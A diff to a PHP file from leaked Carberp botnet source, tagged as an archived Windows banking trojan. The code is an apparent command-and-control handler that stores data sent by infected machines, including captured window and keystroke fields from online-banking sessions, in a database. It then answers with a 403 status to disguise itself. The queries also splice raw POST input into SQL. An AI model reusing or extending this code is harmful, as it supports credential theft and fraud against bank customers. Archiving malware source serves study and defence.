@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $dbug = false;
@@ -68,9 +79,11 @@ $item = $mysqli->query('SELECT * FROM bf_ibank_gra WHERE (`grp` = \''.$uniq.'\')
 
 $_POST['keyhwnd'] = toUTF8($_POST['keyhwnd']);
 
-if($item->grp == $uniq){	if(!empty($_POST['keyhwnd'])) $sql_add .= 'keyhwnd = \''.$item->keyhwnd . $_POST['keyhwnd'].'\', ';
+if($item->grp == $uniq){
+	if(!empty($_POST['keyhwnd'])) $sql_add .= 'keyhwnd = \''.$item->keyhwnd . $_POST['keyhwnd'].'\', ';
 	if(!empty($sql_add)) $mysqli->query('update bf_ibank_gra set '.rtrim($sql_add, ', ').' WHERE (id = \''.$item->id.'\')');
-}else{	$mysqli->query('INSERT INTO bf_ibank_gra (prefix, uid, pid, host, hwnd, keyhwnd, grp) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \''.$_POST['pid'].'\', \''.$_POST['host'].'\', \''.$_POST['hwnd'].'\' ,\''.$_POST['keyhwnd'].'\' ,\''.$uniq.'\')');
+}else{
+	$mysqli->query('INSERT INTO bf_ibank_gra (prefix, uid, pid, host, hwnd, keyhwnd, grp) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \''.$_POST['pid'].'\', \''.$_POST['host'].'\', \''.$_POST['hwnd'].'\' ,\''.$_POST['keyhwnd'].'\' ,\''.$uniq.'\')');
 }
 
 header("Status: 403 Forbidden");
